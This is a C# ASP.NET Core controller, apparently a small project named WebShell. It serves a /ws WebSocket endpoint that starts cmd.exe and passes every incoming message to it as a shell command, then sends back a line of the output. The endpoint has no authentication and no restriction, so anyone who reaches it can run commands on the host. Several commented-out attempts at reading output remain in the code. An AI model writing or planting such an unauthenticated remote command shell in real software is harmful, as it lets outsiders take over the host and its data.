using System.Diagnostics;
using System.Text;
using Microsoft.AspNetCore.Mvc;
using System.Net.WebSockets;

namespace WebShell.Controllers;

public class WebSocketController : ControllerBase
{
    [Route("/ws")]
    public async Task Get()
    {
        if (HttpContext.WebSockets.IsWebSocketRequest)
        {
            using var webSocket = await HttpContext.WebSockets.AcceptWebSocketAsync();
            await Echo(webSocket);
        }
        else
        {
            HttpContext.Response.StatusCode = StatusCodes.Status400BadRequest;
        }
    }


    private static async Task Echo(WebSocket webSocket)
    {
        var shell = new Process();

        shell.StartInfo = new ProcessStartInfo()
        {
            FileName = "cmd.exe",
            UseShellExecute = false,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        };

        shell.Start();

        var buffer = new byte[1024 * 4];
        var receiveResult = await webSocket.ReceiveAsync(
            new ArraySegment<byte>(buffer), CancellationToken.None);

        while (!receiveResult.CloseStatus.HasValue)
        {
            /* Code for send */
            var command = Encoding.UTF8.GetString(buffer, 0, receiveResult.Count);
            // var stdOutput = new StringBuilder();
            // shell.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);

            Console.WriteLine($"Server command : {command}");

            shell.StandardInput.WriteLine(command);

            // shell.BeginOutputReadLine();
            // string? result;
            // var error =  shell.StandardError.ReadLine();
            // Console.WriteLine("ERROR" + error);

            // var result =  shell.StandardOutput.ReadToEnd();
            // var result = stdOutput.ToString();
            var result = shell.StandardOutput.ReadLine();
            // shell.WaitForExit();


            /*while (shell.StandardOutput.ReadLine() != null)
            {

            }*/


            var mess = Encoding.UTF8.GetBytes(result);

            Console.WriteLine($"res: {result}");
            await webSocket.SendAsync(
                new ArraySegment<byte>(mess, 0, mess.Length),
                receiveResult.MessageType,
                receiveResult.EndOfMessage,
                CancellationToken.None);

            receiveResult = await webSocket.ReceiveAsync(
                new ArraySegment<byte>(buffer), CancellationToken.None);
        }

        shell.Close();

        await webSocket.CloseAsync(
            receiveResult.CloseStatus.Value,
            receiveResult.CloseStatusDescription,
            CancellationToken.None);
    }
}